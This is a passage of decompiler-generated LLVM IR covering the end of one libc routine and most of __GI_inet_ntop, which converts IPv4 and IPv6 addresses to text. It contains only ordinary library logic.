  %v2_8053f0b = call i32 @__errno_location(i32 %v1_8053f0b)
  %v1_8053f10 = inttoptr i32 %v2_8053f0b to i32*
  store i32 28, i32* %v1_8053f10, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8053f29.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053f29

dec_label_pc_8053f1a:                             ; preds = %dec_label_pc_8053ef0
  %v2_8053ef8 = ptrtoint i32* %stack_var_-33 to i32
  %tmp28 = bitcast i8** %stack_var_-56 to i32*
  %v3_8053f1d4 = load i32, i32* %tmp28, align 4
  %tmp29 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_8053f1d4, i32* %tmp29, align 4
  %v0_8053f21.cast = inttoptr i32 %v3_8053f1d4 to i8*
  %v4_8053f21 = call i32 @strcpy(i8* %v0_8053f21.cast, i32 %v2_8053ef8)
  store i32 %v4_8053f21, i32* %eax.global-to-local, align 4
  %v0_8053f26 = load i32, i32* @esp, align 4
  %v6_8053f26 = icmp eq i32 %v0_8053f26, -16
  store i1 %v6_8053f26, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8053f29

dec_label_pc_8053f29:                             ; preds = %dec_label_pc_8053f0b, %dec_label_pc_8053f1a
  %v0_8053f30 = phi i32 [ 0, %dec_label_pc_8053f0b ], [ %v4_8053f21, %dec_label_pc_8053f1a ]
  %v0_8053f29 = phi i32 [ %v0_8053f29.pre, %dec_label_pc_8053f0b ], [ %v15_8053e26, %dec_label_pc_8053f1a ]
  %v9_8053f29 = icmp eq i32 %v0_8053f29, -60
  store i1 %v9_8053f29, i1* %zf.global-to-local, align 1
  store i32 %v0_8053e22, i32* @esi, align 4
  store i32 %v0_8053e21, i32* @edi, align 4
  ret i32 %v0_8053f30

; uselistorder directives
  uselistorder i32 %v0_8053ee7, { 2, 0, 1 }
  uselistorder i8 %v2_8053ec1, { 1, 0 }
  uselistorder i32 %v0_8053ea6, { 1, 0 }
  uselistorder i1 %v11_8053e77, { 1, 0 }
  uselistorder i32 %v1_8053e6e, { 1, 0 }
  uselistorder i32 %v5_8053e5c, { 1, 0 }
  uselistorder i32 %v0_8053ee730, { 1, 2, 0 }
  uselistorder i32* %stack_var_-33, { 2, 0, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 12, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 -16, { 0, 1, 23, 24, 25, 14, 16, 17, 13, 15, 8, 18, 12, 19, 20, 21, 22, 26, 36, 37, 9, 31, 27, 10, 28, 29, 30, 32, 33, 11, 34, 35, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 2, 3, 4, 0, 1 }
  uselistorder i8 48, { 11, 7, 8, 0, 9, 12, 13, 1, 10, 2, 3, 5, 4, 6, 14 }
  uselistorder i8 100, { 2, 3, 0, 1 }
  uselistorder i1* @df, { 4, 28, 29, 0, 1, 30, 31, 32, 11, 2, 3, 40, 41, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 -65536, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8053f29, { 1, 0 }
  uselistorder label %dec_label_pc_8053ec7, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8053f32 = load i32, i32* @edi, align 4
  %v0_8053f33 = load i32, i32* @esi, align 4
  %v0_8053f34 = load i32, i32* @ebx, align 4
  %v15_8053f35 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8053f3c = icmp eq i32 %arg1, 2
  br i1 %v9_8053f3c, label %dec_label_pc_8053f4c, label %dec_label_pc_8053f41

dec_label_pc_8053f41:                             ; preds = %entry
  %v9_8053f41 = icmp eq i32 %arg1, 10
  %v1_8053f44 = icmp eq i1 %v9_8053f41, false
  br i1 %v1_8053f44, label %dec_label_pc_80540eb, label %dec_label_pc_8053f64

dec_label_pc_8053f4c:                             ; preds = %entry
  %v4_8053f4c = ptrtoint i8* %arg3 to i32
  store i32 %v4_8053f4c, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8053f58 = call i32 @inet_ntop4(i32 %v0_8053f34, i32 %v0_8053f33, i32 %v0_8053f32)
  store i32 %v3_8053f58, i32* %eax.global-to-local, align 4
  store i32 %v3_8053f58, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80540f8

dec_label_pc_8053f64:                             ; preds = %dec_label_pc_8053f41
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8053f69 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8053f69, i32* %eax.global-to-local, align 4
  %tmp42 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp42, i8** %stack_var_-124, align 4
  %v6_8053f6e = call i32 @__GI_memset(i8* %tmp42, i32 0, i32 32)
  store i32 %v6_8053f6e, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8053f90 = add i32 %arg2, 1
  br label %dec_label_pc_8053f7a

dec_label_pc_8053f7a:                             ; preds = %dec_label_pc_8053f7a.dec_label_pc_8053f7a_crit_edge, %dec_label_pc_8053f64
  %v1_8053f9d = phi i32 [ %v15_8053f35, %dec_label_pc_8053f64 ], [ %v1_8053f9d.pre, %dec_label_pc_8053f7a.dec_label_pc_8053f7a_crit_edge ]
  %v0_8053f9569 = phi i32 [ 0, %dec_label_pc_8053f64 ], [ %v0_8053fa1.pre, %dec_label_pc_8053f7a.dec_label_pc_8053f7a_crit_edge ]
  %v1_8053f83 = ashr i32 %v0_8053f9569, 31
  %v2_8053f84 = zext i32 %v0_8053f9569 to i64
  %v4_8053f84 = zext i32 %v1_8053f83 to i64
  %v5_8053f84 = mul nuw i64 %v4_8053f84, 4294967296
  %v6_8053f84 = or i64 %v5_8053f84, %v2_8053f84
  %v8_8053f84 = sdiv i64 %v6_8053f84, 2
  %v9_8053f84 = trunc i64 %v8_8053f84 to i32
  store i32 %v9_8053f84, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8053f84, i32* %ebx.global-to-local, align 4
  %v2_8053f8c = add i32 %v0_8053f9569, %arg2
  %v3_8053f8c = inttoptr i32 %v2_8053f8c to i8*
  %v4_8053f8c = load i8, i8* %v3_8053f8c, align 1
  %v5_8053f8c = zext i8 %v4_8053f8c to i32
  store i32 %v5_8053f8c, i32* %eax.global-to-local, align 4
  %v3_8053f90 = add i32 %v2_8053f90, %v0_8053f9569
  %v4_8053f90 = inttoptr i32 %v3_8053f90 to i8*
  %v5_8053f90 = load i8, i8* %v4_8053f90, align 1
  %v6_8053f90 = zext i8 %v5_8053f90 to i32
  store i32 %v6_8053f90, i32* %edx.global-to-local, align 4
  %v1_8053f95 = add i32 %v0_8053f9569, 2
  store i32 %v1_8053f95, i32* %ecx.global-to-local, align 4
  %v2_8053f98 = mul nuw nsw i32 %v5_8053f8c, 256
  %v2_8053f9b = or i32 %v6_8053f90, %v2_8053f98
  store i32 %v2_8053f9b, i32* %eax.global-to-local, align 4
  %v3_8053f9d = mul i32 %v9_8053f84, 4
  %v4_8053f9d = add i32 %v3_8053f9d, 60
  %v5_8053f9d = add i32 %v4_8053f9d, %v1_8053f9d
  %v6_8053f9d = inttoptr i32 %v5_8053f9d to i32*
  store i32 %v2_8053f9b, i32* %v6_8053f9d, align 4
  %v0_8053fa1.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8053fa4 = icmp sgt i32 %v0_8053fa1.pre, 15
  br i1 %v7_8053fa4, label %dec_label_pc_8053fa6, label %dec_label_pc_8053f7a.dec_label_pc_8053f7a_crit_edge

dec_label_pc_8053f7a.dec_label_pc_8053f7a_crit_edge: ; preds = %dec_label_pc_8053f7a
  %v1_8053f9d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053f7a

dec_label_pc_8053fa6:                             ; preds = %dec_label_pc_8053f7a
  %v4_8053f64 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8053fb0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053fb0

dec_label_pc_8053fb0:                             ; preds = %dec_label_pc_8053fa6, %dec_label_pc_8053fdd
  %v0_8053fdd68 = phi i32 [ 0, %dec_label_pc_8053fa6 ], [ %v1_8053fdd, %dec_label_pc_8053fdd ]
  %v0_8053fc867 = phi i32 [ -1, %dec_label_pc_8053fa6 ], [ %v0_8053fc87, %dec_label_pc_8053fdd ]
  %v0_8053fe866 = phi i32 [ -1, %dec_label_pc_8053fa6 ], [ %v0_8053fcd8, %dec_label_pc_8053fdd ]
  %v0_8053ff365 = phi i32 [ -1, %dec_label_pc_8053fa6 ], [ %v0_8053fd812, %dec_label_pc_8053fdd ]
  %v2_8053fb0 = mul nuw nsw i32 %v0_8053fdd68, 4
  %v3_8053fb0 = add nuw nsw i32 %v2_8053fb0, 60
  %v4_8053fb0 = add i32 %v3_8053fb0, %v0_8053fb0.pre
  %v5_8053fb0 = inttoptr i32 %v4_8053fb0 to i32*
  %v6_8053fb0 = load i32, i32* %v5_8053fb0, align 4
  %v7_8053fb0 = icmp eq i32 %v6_8053fb0, 0
  %v1_8053fb5 = icmp eq i1 %v7_8053fb0, false
  %v10_8053fc8 = icmp eq i32 %v0_8053fc867, -1
  br i1 %v1_8053fb5, label %dec_label_pc_8053fc8, label %dec_label_pc_8053fb7

dec_label_pc_8053fb7:                             ; preds = %dec_label_pc_8053fb0
  %v1_8053fba = icmp eq i1 %v10_8053fc8, false
  br i1 %v1_8053fba, label %dec_label_pc_8053fc5, label %dec_label_pc_8053fbc

dec_label_pc_8053fbc:                             ; preds = %dec_label_pc_8053fb7
  store i32 %v0_8053fdd68, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053fdd

dec_label_pc_8053fc5:                             ; preds = %dec_label_pc_8053fb7
  %v0_8053fc5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053fc5 = add i32 %v0_8053fc5, 1
  store i32 %v1_8053fc5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053fdd

dec_label_pc_8053fc8:                             ; preds = %dec_label_pc_8053fb0
  br i1 %v10_8053fc8, label %dec_label_pc_8053fdd, label %dec_label_pc_8053fcd

dec_label_pc_8053fcd:                             ; preds = %dec_label_pc_8053fc8
  %v10_8053fcd = icmp eq i32 %v0_8053fe866, -1
  %v0_8053fd6.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053fd2 = load i32, i32* @ebp, align 4
  %v7_8053fd4 = icmp sgt i32 %v0_8053fd6.pre, %v1_8053fd2
  %or.cond = or i1 %v10_8053fcd, %v7_8053fd4
  br i1 %or.cond, label %dec_label_pc_8053fd6, label %dec_label_pc_8053fda

dec_label_pc_8053fd6:                             ; preds = %dec_label_pc_8053fcd
  store i32 %v0_8053fd6.pre, i32* @ebp, align 4
  store i32 %v0_8053ff365, i32* @edi, align 4
  br label %dec_label_pc_8053fda

dec_label_pc_8053fda:                             ; preds = %dec_label_pc_8053fcd, %dec_label_pc_8053fd6
  %v0_8053fcd10 = phi i32 [ %v0_8053ff365, %dec_label_pc_8053fd6 ], [ %v0_8053fe866, %dec_label_pc_8053fcd ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053fdd

dec_label_pc_8053fdd:                             ; preds = %dec_label_pc_8053fc8, %dec_label_pc_8053fc5, %dec_label_pc_8053fbc, %dec_label_pc_8053fda
  %v0_8053fd812 = phi i32 [ %v0_8053ff365, %dec_label_pc_8053fc8 ], [ %v0_8053ff365, %dec_label_pc_8053fc5 ], [ %v0_8053fdd68, %dec_label_pc_8053fbc ], [ -1, %dec_label_pc_8053fda ]
  %v0_8053fc87 = phi i32 [ -1, %dec_label_pc_8053fc8 ], [ %v0_8053fc867, %dec_label_pc_8053fc5 ], [ %v0_8053fdd68, %dec_label_pc_8053fbc ], [ -1, %dec_label_pc_8053fda ]
  %v0_8053fcd8 = phi i32 [ %v0_8053fe866, %dec_label_pc_8053fc8 ], [ %v0_8053fe866, %dec_label_pc_8053fc5 ], [ %v0_8053fe866, %dec_label_pc_8053fbc ], [ %v0_8053fcd10, %dec_label_pc_8053fda ]
  %v1_8053fdd = add nuw nsw i32 %v0_8053fdd68, 1
  store i32 %v1_8053fdd, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8053fdd, 8
  br i1 %exitcond, label %dec_label_pc_8053fe3, label %dec_label_pc_8053fb0

dec_label_pc_8053fe3:                             ; preds = %dec_label_pc_8053fdd
  %v10_8053fe3 = icmp eq i32 %v0_8053fd812, -1
  br i1 %v10_8053fe3, label %dec_label_pc_8053ff5, label %dec_label_pc_8053fe8

dec_label_pc_8053fe8:                             ; preds = %dec_label_pc_8053fe3
  %v10_8053fe8 = icmp eq i32 %v0_8053fcd8, -1
  %v0_8053ff1.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8053fe8, label %dec_label_pc_8053ff1, label %dec_label_pc_8053fed

dec_label_pc_8053fed:                             ; preds = %dec_label_pc_8053fe8
  %v1_8053fed = load i32, i32* @ebp, align 4
  %v7_8053fef = icmp sgt i32 %v0_8053ff1.pre, %v1_8053fed
  br i1 %v7_8053fef, label %dec_label_pc_8053ff1, label %dec_label_pc_8053ff5

dec_label_pc_8053ff1:                             ; preds = %dec_label_pc_8053fe8, %dec_label_pc_8053fed
  store i32 %v0_8053ff1.pre, i32* @ebp, align 4
  store i32 %v0_8053fd812, i32* @edi, align 4
  br label %dec_label_pc_8053ff5

dec_label_pc_8053ff5:                             ; preds = %dec_label_pc_8053fed, %dec_label_pc_8053fe3, %dec_label_pc_8053ff1
  %v5_8054002 = phi i32 [ %v0_8053fcd8, %dec_label_pc_8053fed ], [ %v0_8053fcd8, %dec_label_pc_8053fe3 ], [ %v0_8053fd812, %dec_label_pc_8053ff1 ]
  %v10_8053ff5 = icmp eq i32 %v5_8054002, -1
  br i1 %v10_8053ff5, label %dec_label_pc_8054005, label %dec_label_pc_8053ffa

dec_label_pc_8053ffa:                             ; preds = %dec_label_pc_8053ff5
  %v0_8053ffa = load i32, i32* @ebp, align 4
  %v1_8053ffa = add i32 %v0_8053ffa, -1
  %v6_8053ffa = sub i32 0, %v0_8053ffa
  %v7_8053ffa = and i32 %v0_8053ffa, %v6_8053ffa
  %v8_8053ffa = icmp slt i32 %v7_8053ffa, 0
  %v9_8053ffa = icmp eq i32 %v1_8053ffa, 0
  %v10_8053ffa = icmp slt i32 %v1_8053ffa, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_8054002 = icmp ne i1 %v10_8053ffa, %v8_8053ffa
  %v4_8054002 = or i1 %v9_8053ffa, %v3_8054002
  %v7_8054002 = select i1 %v4_8054002, i32 -1, i32 %v5_8054002
  store i32 %v7_8054002, i32* @edi, align 4
  br label %dec_label_pc_8054005

dec_label_pc_8054005:                             ; preds = %dec_label_pc_8053ff5, %dec_label_pc_8053ffa
  %v0_80540a517 = phi i32 [ %v5_8054002, %dec_label_pc_8053ff5 ], [ %v7_8054002, %dec_label_pc_8053ffa ]
  %v2_8054005 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8054005, i32* @ebx, align 4
  %v3_8054087 = add i32 %v4_8053f64, 64
  %v12_8054045 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_80540a557 = icmp eq i32 %v0_80540a517, -1
  %v1_805404d = icmp eq i1 %v12_8054045, false
  br label %dec_label_pc_8054010

dec_label_pc_8054010:                             ; preds = %dec_label_pc_8054005, %dec_label_pc_805409b
  %v10_80540a564 = phi i1 [ %v10_80540a557, %dec_label_pc_8054005 ], [ %v10_80540a5, %dec_label_pc_805409b ]
  %v0_805402a63 = phi i32 [ 0, %dec_label_pc_8054005 ], [ %v1_805409b, %dec_label_pc_805409b ]
  %v1_805402062 = phi i32 [ %v0_80540a517, %dec_label_pc_8054005 ], [ %v0_80540a5.pre, %dec_label_pc_805409b ]
  %v0_805402e61 = phi i32 [ %v2_8054005, %dec_label_pc_8054005 ], [ %v0_805402418, %dec_label_pc_805409b ]
  %stack_var_-120.160 = phi i8* [ null, %dec_label_pc_8054005 ], [ %stack_var_-120.0, %dec_label_pc_805409b ]
  %stack_var_-116.159 = phi i32 [ 32, %dec_label_pc_8054005 ], [ %stack_var_-116.0, %dec_label_pc_805409b ]
  br i1 %v10_80540a564, label %dec_label_pc_805402a, label %dec_label_pc_8054015

dec_label_pc_8054015:                             ; preds = %dec_label_pc_8054010
  %v2_8054015 = sub i32 %v0_805402a63, %v1_805402062
  %v8_8054015 = xor i32 %v0_805402a63, %v1_805402062
  %v9_8054015 = xor i32 %v2_8054015, %v0_805402a63
  %v10_8054015 = and i32 %v9_8054015, %v8_8054015
  %v11_8054015 = icmp slt i32 %v10_8054015, 0
  %v12_8054015 = icmp eq i32 %v2_8054015, 0
  %v13_8054015 = icmp slt i32 %v2_8054015, 0
  %v2_8054017 = icmp eq i1 %v13_8054015, %v11_8054015
  br i1 %v2_8054017, label %dec_label_pc_8054019, label %dec_label_pc_805402a

dec_label_pc_8054019:                             ; preds = %dec_label_pc_8054015
  %v1_8054019 = load i32, i32* @ebp, align 4
  %v2_8054019 = add i32 %v1_8054019, %v1_805402062
  store i32 %v2_8054019, i32* %eax.global-to-local, align 4
  %v2_805401c = sub i32 %v0_805402a63, %v2_8054019
  %v8_805401c = xor i32 %v2_8054019, %v0_805402a63
  %v9_805401c = xor i32 %v2_805401c, %v0_805402a63
  %v10_805401c = and i32 %v9_805401c, %v8_805401c
  %v11_805401c = icmp slt i32 %v10_805401c, 0
  %v13_805401c = icmp slt i32 %v2_805401c, 0
  %v2_805401e = icmp eq i1 %v13_805401c, %v11_805401c
  br i1 %v2_805401e, label %dec_label_pc_805402a, label %dec_label_pc_8054020

dec_label_pc_8054020:                             ; preds = %dec_label_pc_8054019
  %v1_8054022 = icmp eq i1 %v12_8054015, false
  br i1 %v1_8054022, label %dec_label_pc_805409b, label %dec_label_pc_8054024

dec_label_pc_8054024:                             ; preds = %dec_label_pc_8054020
  %v1_8054024 = inttoptr i32 %v0_805402e61 to i8*
  store i8 58, i8* %v1_8054024, align 1
  %v0_8054027 = load i32, i32* @ebx, align 4
  %v1_8054027 = add i32 %v0_8054027, 1
  store i32 %v1_8054027, i32* @ebx, align 4
  br label %dec_label_pc_805409b

dec_label_pc_805402a:                             ; preds = %dec_label_pc_8054015, %dec_label_pc_8054019, %dec_label_pc_8054010
  %v1_805402a = icmp eq i32 %v0_805402a63, 0
  br i1 %v1_805402a, label %dec_label_pc_8054032, label %dec_label_pc_805402e

dec_label_pc_805402e:                             ; preds = %dec_label_pc_805402a
  %v1_805402e = inttoptr i32 %v0_805402e61 to i8*
  store i8 58, i8* %v1_805402e, align 1
  %v0_8054031 = load i32, i32* @ebx, align 4
  %v1_8054031 = add i32 %v0_8054031, 1
  store i32 %v1_8054031, i32* @ebx, align 4
  %v0_8054032.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8054032

dec_label_pc_8054032:                             ; preds = %dec_label_pc_805402a, %dec_label_pc_805402e
  %v0_8054090 = phi i32 [ %v0_805402e61, %dec_label_pc_805402a ], [ %v1_8054031, %dec_label_pc_805402e ]
  %v1_8054087 = phi i32 [ 0, %dec_label_pc_805402a ], [ %v0_8054032.pre, %dec_label_pc_805402e ]
  %v9_8054032 = icmp eq i32 %v1_8054087, 6
  %v1_8054035 = icmp eq i1 %v9_8054032, false
  br i1 %v1_8054035, label %dec_label_pc_8054086, label %dec_label_pc_8054037

dec_label_pc_8054037:                             ; preds = %dec_label_pc_8054032
  %v0_8054037 = load i32, i32* @edi, align 4
  %v1_8054037 = icmp eq i32 %v0_8054037, 0
  %v1_8054039 = icmp eq i1 %v1_8054037, false
  br i1 %v1_8054039, label %dec_label_pc_8054086, label %dec_label_pc_805403b

dec_label_pc_805403b:                             ; preds = %dec_label_pc_8054037
  %v0_805403b = load i32, i32* @ebp, align 4
  %v9_805403b = icmp eq i32 %v0_805403b, 6
  br i1 %v9_805403b, label %dec_label_pc_805404f, label %dec_label_pc_8054040

dec_label_pc_8054040:                             ; preds = %dec_label_pc_805403b
  %v9_8054040 = icmp eq i32 %v0_805403b, 5
  %v1_8054043 = icmp eq i1 %v9_8054040, false
  br i1 %v1_8054043, label %dec_label_pc_8054086, label %dec_label_pc_8054045

dec_label_pc_8054045:                             ; preds = %dec_label_pc_8054040
  br i1 %v1_805404d, label %dec_label_pc_8054086, label %dec_label_pc_805404f

dec_label_pc_805404f:                             ; preds = %dec_label_pc_8054045, %dec_label_pc_805403b
  %v2_8054055 = sub i32 %v0_8054090, %v2_8054005
  store i32 %v2_8054055, i32* @esi, align 4
  %v2_8054060 = sub i32 46, %v2_8054055
  store i32 %v2_8054060, i32* @ecx, align 4
  store i32 %v0_8054090, i32* @edx, align 4
  %v1_8054064 = add i32 %arg2, 12
  store i32 %v1_8054064, i32* @eax, align 4
  %v0_8054067 = load i8*, i8** %stack_var_-124, align 4
  %v1_8054067 = ptrtoint i8* %v0_8054067 to i32
  %v3_8054067 = ptrtoint i8* %stack_var_-120.160 to i32
  %v5_8054067 = call i32 @inet_ntop4(i32 %v1_8054067, i32 %v3_8054067, i32 %stack_var_-116.159)
  store i32 %v5_8054067, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805406e = icmp eq i32 %v5_8054067, 0
  br i1 %v1_805406e, label %dec_label_pc_80540f8, label %dec_label_pc_8054076

dec_label_pc_8054076:                             ; preds = %dec_label_pc_805404f
  %v0_8054079 = load i32, i32* @ebx, align 4
  %v5_8054079 = inttoptr i32 %v0_8054079 to i8*
  store i8* %v5_8054079, i8** %stack_var_-124, align 4
  %v3_805407a = call i32 @strlen(i8* %v5_8054079)
  store i32 %v3_805407a, i32* %eax.global-to-local, align 4
  %v0_8054082 = load i32, i32* @ebx, align 4
  %v3_8054082 = add i32 %v0_8054082, %v3_805407a
  store i32 %v3_8054082, i32* @ebx, align 4
  %v0_80540aa.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80540aa

dec_label_pc_8054086:                             ; preds = %dec_label_pc_8054045, %dec_label_pc_8054040, %dec_label_pc_8054037, %dec_label_pc_8054032
  %v0_8054086 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8054086, i32* %stack_var_-112, align 4
  %v2_8054087 = mul i32 %v1_8054087, 4
  %v4_8054087 = add i32 %v3_8054087, %v2_8054087
  %v5_8054087 = inttoptr i32 %v4_8054087 to i32*
  %v6_8054087 = load i32, i32* %v5_8054087, align 4
  %v5_8054090 = inttoptr i32 %v0_8054090 to i8*
  store i8* %v5_8054090, i8** %stack_var_-124, align 4
  %v6_8054091 = call i32 @sprintf(i32 %v0_8054090, i32 ptrtoint ([3 x i8]* @global_var_8057a71.247 to i32), i32 %v6_8054087, i32 %v0_8054086)
  store i32 %v6_8054091, i32* %eax.global-to-local, align 4
  %v0_8054099 = load i32, i32* @ebx, align 4
  %v2_8054099 = add i32 %v0_8054099, %v6_8054091
  store i32 %v2_8054099, i32* @ebx, align 4
  br label %dec_label_pc_805409b

dec_label_pc_805409b:                             ; preds = %dec_label_pc_8054020, %dec_label_pc_8054024, %dec_label_pc_8054086
  %stack_var_-116.0 = phi i32 [ %v6_8054087, %dec_label_pc_8054086 ], [ %stack_var_-116.159, %dec_label_pc_8054020 ], [ %stack_var_-116.159, %dec_label_pc_8054024 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057a71.247, i32 0, i32 0), %dec_label_pc_8054086 ], [ %stack_var_-120.160, %dec_label_pc_8054020 ], [ %stack_var_-120.160, %dec_label_pc_8054024 ]
  %v0_805402418 = phi i32 [ %v2_8054099, %dec_label_pc_8054086 ], [ %v0_805402e61, %dec_label_pc_8054020 ], [ %v1_8054027, %dec_label_pc_8054024 ]
  %v0_805409b = load i32, i32* @esi, align 4
  %v1_805409b = add i32 %v0_805409b, 1
  %v0_80540a5.pre = load i32, i32* @edi, align 4
  store i32 %v1_805409b, i32* @esi, align 4
  %v7_805409f = icmp sgt i32 %v1_805409b, 7
  %v10_80540a5 = icmp eq i32 %v0_80540a5.pre, -1
  br i1 %v7_805409f, label %dec_label_pc_80540a5, label %dec_label_pc_8054010

dec_label_pc_80540a5:                             ; preds = %dec_label_pc_805409b
  br i1 %v10_80540a5, label %dec_label_pc_80540b6, label %dec_label_pc_80540aa

dec_label_pc_80540aa:                             ; preds = %dec_label_pc_80540a5, %dec_label_pc_8054076
  %v0_80540b2 = phi i32 [ %v0_805402418, %dec_label_pc_80540a5 ], [ %v3_8054082, %dec_label_pc_8054076 ]
  %v0_80540aa = phi i32 [ %v0_80540a5.pre, %dec_label_pc_80540a5 ], [ %v0_80540aa.pre, %dec_label_pc_8054076 ]
  %v1_80540aa = load i32, i32* @ebp, align 4
  %v2_80540aa = add i32 %v1_80540aa, %v0_80540aa
  store i32 %v2_80540aa, i32* %eax.global-to-local, align 4
  %v9_80540ad = icmp eq i32 %v2_80540aa, 8
  %v1_80540b0 = icmp eq i1 %v9_80540ad, false
  br i1 %v1_80540b0, label %dec_label_pc_80540b6, label %dec_label_pc_80540b2

dec_label_pc_80540b2:                             ; preds = %dec_label_pc_80540aa
  %v1_80540b2 = inttoptr i32 %v0_80540b2 to i8*
  store i8 58, i8* %v1_80540b2, align 1
  %v0_80540b5 = load i32, i32* @ebx, align 4
  %v1_80540b5 = add i32 %v0_80540b5, 1
  store i32 %v1_80540b5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80540b6

dec_label_pc_80540b6:                             ; preds = %dec_label_pc_80540aa, %dec_label_pc_80540a5, %dec_label_pc_80540b2
  %v0_80540ba = phi i32 [ %v0_80540b2, %dec_label_pc_80540aa ], [ %v0_805402418, %dec_label_pc_80540a5 ], [ %v1_80540b5, %dec_label_pc_80540b2 ]
  store i32 %v2_8054005, i32* %edx.global-to-local, align 4
  %v1_80540ba = add i32 %v0_80540ba, 1
  store i32 %v1_80540ba, i32* %eax.global-to-local, align 4
  %v1_80540bd = inttoptr i32 %v0_80540ba to i8*
  store i8 0, i8* %v1_80540bd, align 1
  %v0_80540c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80540c0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80540c0 = sub i32 %v0_80540c0, %v1_80540c0
  store i32 %v2_80540c0, i32* @eax, align 4
  %tmp74 = icmp ugt i32 %v2_80540c0, %arg4
  br i1 %tmp74, label %dec_label_pc_80540c8, label %dec_label_pc_80540d5

dec_label_pc_80540c8:                             ; preds = %dec_label_pc_80540b6
  %v0_80540c8 = load i8*, i8** %stack_var_-124, align 4
  %v1_80540c8 = ptrtoint i8* %v0_80540c8 to i32
  %v2_80540c8 = call i32 @__errno_location(i32 %v1_80540c8)
  store i32 %v2_80540c8, i32* %eax.global-to-local, align 4
  %v1_80540cd = inttoptr i32 %v2_80540c8 to i32*
  store i32 28, i32* %v1_80540cd, align 4
  br label %dec_label_pc_80540f6

dec_label_pc_80540d5:                             ; preds = %dec_label_pc_80540b6
  %v0_80540d5 = load i32, i32* @edi, align 4
  store i32 %v0_80540d5, i32* %stack_var_-112, align 4
  %tmp44 = bitcast i8** %stack_var_12 to i32*
  %v3_80540d81 = load i32, i32* %tmp44, align 4
  %tmp45 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_80540d81, i32* %tmp45, align 4
  %v0_80540df.cast = inttoptr i32 %v3_80540d81 to i8*
  %v5_80540df = call i32 @strcpy(i8* %v0_80540df.cast, i32 %v2_8054005)
  store i32 %v5_80540df, i32* %eax.global-to-local, align 4
  store i32 %v5_80540df, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80540f8

dec_label_pc_80540eb:                             ; preds = %dec_label_pc_8053f41
  %v1_80540eb = call i32 @__errno_location(i32 %v0_8053f34)
  store i32 %v1_80540eb, i32* %eax.global-to-local, align 4
  %v1_80540f0 = inttoptr i32 %v1_80540eb to i32*
  store i32 97, i32* %v1_80540f0, align 4
  br label %dec_label_pc_80540f6

dec_label_pc_80540f6:                             ; preds = %dec_label_pc_80540c8, %dec_label_pc_80540eb
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80540f8

dec_label_pc_80540f8:                             ; preds = %dec_label_pc_805404f, %dec_label_pc_80540d5, %dec_label_pc_8053f4c, %dec_label_pc_80540f6
